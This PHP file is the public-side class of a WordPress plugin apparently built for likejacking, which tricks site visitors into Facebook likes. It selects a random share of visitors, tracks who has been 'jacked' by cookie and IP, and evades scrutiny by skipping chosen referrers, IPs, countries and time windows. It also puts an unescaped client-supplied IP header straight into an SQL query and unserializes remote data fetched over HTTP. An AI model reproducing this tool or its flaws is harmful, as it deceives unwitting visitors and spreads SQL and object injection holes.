<?php

/**
 * The public-facing functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the dashboard-specific stylesheet and JavaScript.
 *
 * @package    Like_Jacking_Ninja
 * @subpackage Like_Jacking_Ninja/public
 * @author     We Build Tools
 */
class LJNPublic 
{
    private $use_app_id;

	public function init($is_active)
	{
        $this->setUseAppId();
        if($is_active && $this->isJackerAllowed() && $this->isUserLucky()) {
            add_action('init', array($this, 'startPlugin'));
        }
    }

    private function setUseAppId()
    {
        $this->use_app_id = (get_option('ljn_use_app_id') == '1' && get_option('ljn_app_id') != '') ? true : false;
    }

    public function startPlugin()
    {
        $this->storeJackingUrlInSession();
        if($this->userNotJacked()) {
            $this->loadActions();
        }
    }

    public function storeJackingUrlInSession()
    {
        if(!session_id()) {
            session_start();
        }

        if(!isset($_SESSION['ljn_url']) || $_SESSION['ljn_url'] == '') {
            $page_id = url_to_postid(wp_get_referer());
            $url = get_post_meta($page_id, 'ljn_url', true);

            if($url == '' || !$url) {
                $url_pool = (array) get_option('ljn_urls');
                if(count($url_pool) > 0) {
                    $url = $url_pool[mt_rand(0, count($url_pool)-1)];
                }
            }

            $_SESSION['ljn_url'] = $url;
        }
    }

    public function userNotJacked()
    {
        return $this->noCookie() && $this->noDatabaseEntry();
    }

    public function isUserLucky()
    {
        $percentage = get_option('ljn_percentage');
        return mt_rand(0, 99) < $percentage;
    }

    private function noCookie()
    {
        $hash = md5($_SESSION['ljn_url']);
        $new_cookie = 'wordpress_ljn_' . $hash;
        $old_cookie = 'wordpress_' . $hash;
        if((isset($_COOKIE[$new_cookie]) && $_COOKIE[$new_cookie] == 1) || isset($_COOKIE[$old_cookie])) {
            return false;
        }
        return true;
    }

    private function noDatabaseEntry()
    {
        global $wpdb;
        $table_name = $wpdb->prefix . 'like_jacking_ninja';

        $query = "SELECT COUNT(*) FROM $table_name WHERE ip=\"" . $this->getIp() . "\"";
        $count = (int)$wpdb->get_var($query);

        if( ! is_null($count) && $count > 0) {
            return false;
        } else {
            return true;
        }
    }

	private function loadActions()
	{
        add_action('wp_footer', array($this, 'addIncludes'));
		add_action('wp_enqueue_scripts', array($this, 'enqueueAssets'));
        add_action('wp_ajax_nopriv_get_settings', array($this, 'getSettings'));
        add_action('wp_ajax_nopriv_log', array($this, 'log'));
	}

    public function log()
    {
        $jacked_url = $_POST['ljn_url'];
        $this->logCookie($jacked_url);
        $this->logInDatabase();
        die('success');
    }

    private function logCookie($jacked_url)
    {
        setcookie( 'wordpress_ljn_' . md5( $jacked_url ), 1, time() +  86400 * 365, '/' );
    }

    private function logInDatabase()
    {
        global $wpdb;
        $table_name = $wpdb->prefix . 'like_jacking_ninja';

        if ( ! $wpdb->insert(
            $table_name,
            array('ip' => $this->getIp()),
            array('%s')
        ) ) die('error');
    }

    public function addIncludes()
    {
        if($this->use_app_id) {
            include('js/ljn-app-id.php');
        } else {
            echo ('<div id="fb-root"></div>');
        }
    }

    /**
     * Register the stylesheets for the public-facing side of the site.
     * @since    1.0.0
     */
    public function enqueueAssets() 
    {
        wp_enqueue_style( 'ljn-styles-public', plugin_dir_url(__FILE__) . 'css/ljn-styles.css', array(), LJNLicense::VERSION, 'all' );
        wp_enqueue_style( 'reveal-styles', plugin_dir_url(__FILE__) . 'js/reveal/reveal.css' );

        wp_enqueue_script( 'reveal-scripts', plugin_dir_url( __FILE__ ) . 'js/reveal/jquery.reveal.js', array('jquery') );
        if(!$this->use_app_id) {
            wp_enqueue_script( 'ljn-scripts-public', plugin_dir_url( __FILE__ ) . 'js/ljn-scripts.js', array( 'jquery', 'reveal-scripts' ), LJNLicense::VERSION, true );
            wp_localize_script( 'ljn-scripts-public', 'ajaxObject', array( 'ajaxUrl' => admin_url( 'admin-ajax.php' ) ) );
        }
    }

    /**
     * Return the ajax response for the public part of the plugin
     * @return json
     */
    public function getSettings()
    {
        $jack_devices = array();
        foreach(array('desktop' => 'ljn_jack_desktop', 'mobile' => 'ljn_jack_mobile') as $device => $option) {
            if(get_option($option) == '1') {
                $jack_devices[] = $device;
            }
        }

        $response = array(
            'url' => $_SESSION['ljn_url'],
            'modal_window_content' => get_option('ljn_modal_window_content'),
            'jack_devices' => $jack_devices
        );

        echo json_encode($response);
        wp_die();
    }

    /**
     * Checks if Jacker is allowed
     * @return bool
     */
    private function isJackerAllowed()
    {
        return ($this->isRefererBlocked() || $this->isIpBlocked() || $this->isLocationBlocked() || $this->isTimeDisabled()) ? false : true;
    }

    /**
     * Check whether the visitor's location is blocked.
     * @return bool
     */
    private function isLocationBlocked() 
    {
        if ( ! ($locations = get_option( 'ljn_blocked_locations' )) || $locations == '' ) {
            return false;
        }

        $locations = (array) $locations;
        foreach($locations as $index => $loc) {
            if($loc == '') {
                unset($locations[$index]);
            }
        }

        if(count($locations) == 0) {
            return false;
        }

        $ip = $this->getIp();
        // $details = json_decode( file_get_contents( "http://ipinfo.io/{$ip}/json" ) );
        $details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip=' . $ip));
        foreach ( $locations as $location ) {
            $location = strtolower( $location );
            if($location == '' || ! isset($details['geoplugin_countryCode'])) continue;
            if ($details['geoplugin_countryCode'] === $location) {
                return true;
            }
        }
        return false;
    }

    private function getIp()
	{
		if ( ! empty($_SERVER['HTTP_CLIENT_IP'])) {
		    $ip = $_SERVER['HTTP_CLIENT_IP'];
		} elseif ( ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
		    $ip = $_SERVER['REMOTE_ADDR'];
		}
		return $ip;
	}

	/**
	 * Check whether the referer is blocked.
	 * @since    1.0.0
	 */
    private function isRefererBlocked()
    {
		if (isset($_SERVER['HTTP_REFERER'])) {
			$parsed_ref = parse_url( $_SERVER['HTTP_REFERER'] );
			$ref_domain = $parsed_ref['scheme'] . '://' . $parsed_ref['host'];
			$blacklist = (array) get_option( 'ljn_blocked_refs' );
			
			if (
				in_array( $ref_domain, $blacklist ) ||
				in_array( $ref_domain . '/', $blacklist)
			) {
				return true;
			}
		}

		return false;
	}

    /**
     * Checks if the ip is blocked from admin settings
     * @return bool
     */
    private function isIpBlocked()
    {
        $ip = $this->getIp();
        $blocked_ips = explode(' ', get_option('ljn_blocked_ips'));

        return in_array($ip, $blocked_ips);
    }

    /**
     * Check whether the current time interval is allowed for the plugin to work
     * @return bool
     */
    private function isTimeDisabled()
    {
        $disabled_from = strtotime(get_option('ljn_disabled_from'));
        $disabled_to = strtotime(get_option('ljn_disabled_to'));
        $current_time = strtotime('now');

        $time_disabled = false;
        if($disabled_to && $disabled_from) {
            if($disabled_from > $disabled_to) {
                if($current_time > $disabled_from || $current_time < $disabled_to) {
                    $time_disabled = true;
                }
            } else {
                if($current_time > $disabled_from && $current_time < $disabled_to) {
                    $time_disabled = true;
                }
            }
        }

        return $time_disabled;
    }
}
